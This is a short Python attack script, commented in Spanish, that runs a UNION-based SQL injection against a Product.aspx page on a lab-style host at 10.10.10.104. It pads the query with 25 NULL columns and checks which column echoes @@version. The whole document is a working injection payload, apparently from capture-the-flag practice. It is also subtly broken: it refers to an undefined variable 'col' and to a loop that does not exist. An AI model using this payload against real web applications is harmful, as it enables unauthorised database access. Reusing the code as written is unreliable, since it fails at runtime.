#!/usr/bin/python3

import requests

URL = "http://10.10.10.104/mvc"

int_columns = 25
text_for_column = "NULL"
null_values = int_columns * [text_for_column]  # Seria el resultado de generar 25 NULLs en un array

text_to_find = "@@version"  # Será el texto que escribiremos en la web, si se escribe, tenemos un campo para jugar
null_values[1] = text_to_find  # Actualizamos el valor de la posicion 2 (1 al empezar a contar desde 0) en el array por nuestro payload

payload = ','.join(null_values)  # Generamos una cadena separada por `,` con el valor actual del array

data_get = {
    "ProductSubCategoryId": "33 UNION SELECT " + payload + ";-- -"
}
r = requests.get(URL + '/Product.aspx', params=data_get)
if r.status_code == 200 and text_to_find.replace('\'','') in r.text:
    print("\n[+] Payload: %s" % (data_get['ProductSubCategoryId']))
    print("[+] La columna '%d' de nuestro payload nos permite escribir en la web" % (col+1))  # Le sumamos uno, ya que el bucle empieza desde 0

null_values = int_columns * [text_for_column]  # Volvemos a dejar el array con sus 25 NULL, así simplemente remplazara `text_to_find` en el valor de `col` y no en todo.
